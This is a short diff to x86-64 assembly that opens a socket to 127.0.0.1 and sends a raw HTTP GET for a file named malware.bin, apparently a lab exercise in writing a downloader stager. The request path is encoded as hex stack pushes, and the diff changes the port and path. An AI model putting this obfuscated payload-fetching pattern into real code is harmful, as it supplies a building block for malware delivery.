@@ -49,7 +49,7 @@ _start:
     
     
     movw $2, (%rdi) # sin_family = AF_NET
-    movw $16415, 2(%rdi) # sin_port = 8000
+    movw $0x8813, 2(%rdi) # sin_port = 5000
     movl $16777343, 4(%rdi) # sin_addr.s_addr = '127.0.0.1'
 
     movl -4(%rbp), %edi # sockfd
@@ -67,23 +67,26 @@ _start:
     
 
     # pushq 0
-    mov $0x0a0d0a0d31, %rsi
+    mov $0x0a0d0a0d, %rsi
     push %rsi
-    mov $0x2e312f5054544820, %rsi
+    mov $0x312e312f50545448, %rsi
     push %rsi
-    mov $0x6e69622e65726177, %rsi
+    mov $0x206e69622e657261, %rsi
     push %rsi
-    mov $0x6c616d2f20544547, %rsi
-    push %rsi 
+    mov $0x776c616d2f636974, %rsi
+    push %rsi
+    mov $0x6174732f20544547, %rsi
+    push %rsi
     
     mov %rsp, %rsi
-    movl $30, %edx
+    movl $36, %edx # THIS IS THE LENGTH OF THE REQUEST STRING!!!! I HARDCODED IT :)
     xor %r10, %r10
     xor %r8, %r8
     xor %r9, %r9
     mov $44, %rax # sendto syscall
     syscall
 
+    pop %rcx
     pop %rcx
     pop %rcx
     pop %rcx
